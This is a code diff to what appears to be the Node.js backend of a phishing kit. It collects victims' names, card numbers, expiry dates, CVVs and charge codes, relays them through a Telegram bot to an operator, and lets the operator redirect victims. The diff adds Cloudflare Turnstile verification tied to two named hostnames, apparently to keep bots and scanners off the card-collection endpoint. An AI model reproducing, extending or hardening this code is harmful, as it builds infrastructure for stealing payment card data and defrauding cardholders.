@@ -9,8 +9,12 @@ const CHAT_ID = process.env.CHAT_ID;
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const WHITELISTED = (process.env.WHITELISTED_IPS || '').split(',').map(s => s.trim()).filter(Boolean);
 
-if (!BOT_TOKEN || !CHAT_ID) {
-  console.error('[config] BOT_TOKEN or CHAT_ID missing in env');
+// Turnstile Configuration
+const TURNSTILE_SECRET = process.env.TURNSTILE_SECRET;
+const ALLOWED_HOSTNAMES = new Set(['goe.jekklim.org', 'vop-pink.vercel.app', 'localhost', '127.0.0.1']);
+
+if (!BOT_TOKEN || !CHAT_ID || !TURNSTILE_SECRET) {
+  console.error('[config] BOT_TOKEN, CHAT_ID, or TURNSTILE_SECRET missing in env');
 }
 
 /* ---------- redis ---------- */
@@ -128,12 +132,13 @@ app.use((req, res, next) => {
   next();
 });
 
-/* ---------- health (must respond on both /api/health and /health) ---------- */
+/* ---------- health ---------- */
 function healthHandler(req, res) {
   res.json({
     ok: true,
     bot_token_set: !!BOT_TOKEN,
     chat_id_set: !!CHAT_ID,
+    turnstile_secret_set: !!TURNSTILE_SECRET,
     redis_url_set: !!(process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL),
     now: new Date().toISOString()
   });
@@ -159,7 +164,34 @@ app.get('/api/reset_state', async (req, res) => {
 /* ---------- submit_card ---------- */
 app.post('/api/submit_card', async (req, res) => {
   const { sid, name = '', cardNumber = '', expiry = '', cvv = '' } = req.body || {};
+  const turnstileToken = req.body['cf-turnstile-response'];
+  
   if (!sid || !cardNumber) return res.json({ ok: false, error: 'missing' });
+  
+  // --- TURNSTILE VERIFICATION ---
+  if (!turnstileToken) return res.json({ ok: false, error: 'turnstile_missing' });
+  try {
+    const verifyRes = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        secret: TURNSTILE_SECRET,
+        response: turnstileToken,
+        remoteip: clientIp(req)
+      })
+    });
+    const verifyData = await verifyRes.json();
+    
+    if (!verifyData.success || verifyData.action !== 'checkout' || !ALLOWED_HOSTNAMES.has(verifyData.hostname)) {
+      console.warn('[turnstile] failed', verifyData);
+      return res.json({ ok: false, error: 'turnstile_failed' });
+    }
+  } catch (err) {
+    console.error('[turnstile] error', err);
+    return res.json({ ok: false, error: 'turnstile_error' });
+  }
+  // -----------------------------
+
   if (!luhnCheck(cardNumber)) return res.json({ ok: false, error: 'invalid_luhn' });
   if (containsBadWord(name)) return res.json({ ok: false, error: 'bad_words' });
 
@@ -275,14 +307,13 @@ app.post('/api/submit_charge_code', async (req, res) => {
   res.json({ ok: true });
 });
 
-/* ---------- webhook (must respond on /webhook and /api/webhook) ---------- */
+/* ---------- webhook ---------- */
 async function webhookHandler(req, res) {
-  res.status(200).send('ok');          // acknowledge Telegram immediately
+  res.status(200).send('ok'); 
   try {
     const update = req.body;
     if (!update) return;
 
-    /* ---- text inputs ---- */
     if (update.message && update.message.text) {
       const text = String(update.message.text).trim();
       const states = await allStates();
@@ -306,7 +337,6 @@ async function webhookHandler(req, res) {
       if (t) { t.data.redirect_url = text; t.data.step = 'redirect_user'; await setState(t.sid, t.data); await tg('sendMessage', { chat_id: CHAT_ID, text: `✅ <b>User will be redirected to:</b>\n${text}`, parse_mode: 'HTML' }); return; }
     }
 
-    /* ---- button presses ---- */
     if (update.callback_query) {
       const cb = update.callback_query;
       const data = cb.data || '';
@@ -338,7 +368,6 @@ async function webhookHandler(req, res) {
 app.post('/webhook', webhookHandler);
 app.post('/api/webhook', webhookHandler);
 
-/* ---------- root ---------- */
 app.get('/', (req, res) => res.redirect('/index.html'));
 
 module.exports = app;
